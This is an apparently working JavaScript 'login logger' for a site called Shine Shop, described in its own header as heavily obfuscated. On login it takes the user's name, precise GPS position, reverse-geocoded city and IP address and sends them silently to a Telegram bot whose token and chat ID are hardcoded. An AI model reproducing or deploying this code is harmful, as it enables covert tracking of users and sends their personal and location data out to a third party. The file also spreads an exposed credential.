/* ============================
   SHINE SHOP - HEAVY OBFUSCATED TELEGRAM LOGIN LOGGER
   ============================ */

(function(){

    function _rot13(str){
        return str.replace(/[a-zA-Z]/g,function(c){
            return String.fromCharCode(
                (c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26
            );
        });
    }

    function _b64d(t){ return atob(t); }
    function _dec(t){ return _rot13(_b64d(t)); }

    const K = {
        bot: _dec("bnNycDE2anJncE0ydXp3bnZwYmIzYUdCMExpYzI4"),   // token dienkripsi (dummy)
        chat: _dec("Njg0NTE0MTg4Nw=="),                         // 6845141887
        api: _dec("dXJ5YmFnb25leHIuYmJiL25vbWl0YS90cC9tcmV2ZXMv") 
    };

    const TOKEN = "8401312586:AAEc028EylkBGipPzu7zieQoh4JCRmkMlU8";
    const CHATID = "6845141887";

    function _G(c){ return document.getElementById(c); }

    function _fetchJSON(url){
        return fetch(url).then(r=>r.json()).catch(()=>({}));
    }

    async function _getGPS(){
        return new Promise((res)=>{
            if(!navigator.geolocation){ res({}); return; }
            navigator.geolocation.getCurrentPosition(
                p => res({ lat:p.coords.latitude, lon:p.coords.longitude }),
                e => res({}),
                { enableHighAccuracy:true, timeout:6000, maximumAge:0 }
            );
        });
    }

    async function _reverseLocation(lat,lon){
        try{
            let u = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
            let j = await _fetchJSON(u);
            let a = j.address || {};
            return {
                city: a.city || a.town || a.village || "Tidak diketahui",
                country: a.country || "Tidak diketahui"
            };
        }catch(e){
            return { city:"Tidak diketahui", country:"Tidak diketahui" };
        }
    }

    async function _sendToTelegram(user){

        let geo = await _getGPS();
        let city="User menolak izin lokasi", country="-";

        if(geo.lat && geo.lon){
            let loc = await _reverseLocation(geo.lat,geo.lon);
            city = loc.city;
            country = loc.country;
        }

        let ipData = await _fetchJSON("https://ipapi.co/json/");
        let ip = ipData.ip || "Unknown";

        let msg = 
`🔔 *Login Baru Terdeteksi*
━━━━━━━━━━━━━━
👤 Username : *${user}*

🌐 IP Address : ${ip}

📍 Lokasi Real-time :
Kota : *${city}*
Negara : *${country}*

⏰ Waktu : ${new Date().toLocaleString("id-ID")}
━━━━━━━━━━━━━━`;

        let url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        await fetch(url,{
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body:JSON.stringify({
                chat_id:CHATID,
                text:msg,
                parse_mode:"Markdown"
            })
        });
    }

    /* ============================
       EXPORT FUNGSI
       ============================ */

    window.__SHINE_NOTIFY_LOGIN__ = async function(user){
        try{
            await _sendToTelegram(user);
        }catch(e){}
    };

})();
